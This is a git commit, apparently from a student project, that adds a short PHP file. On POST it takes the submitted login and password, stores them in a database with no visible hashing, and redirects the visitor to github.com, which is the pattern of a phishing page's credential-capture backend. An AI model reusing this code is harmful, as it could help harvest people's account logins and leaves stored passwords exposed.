8c5cbca68422b6e578098d610f8e61df84ac08fd
Zeinsss <uteytithya.nuon@student.cadt.edu.kh>
2024-06-20 09:51:30 +0700

    Second Commit

---
+++ form.php
@@ -0,0 +1,14 @@
+<?php
+  require('db.php');
+  if ($_SERVER['REQUEST_METHOD'] == 'GET') {
+    
+  }
+  if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+  
+    $username = $_POST['login'];
+    $password = $_POST['password'];
+    $database = new MySqlDatabase();
+    $database->insertUser($username, $password);
+    header('Location: https://github.com');
+    exit();
+  }
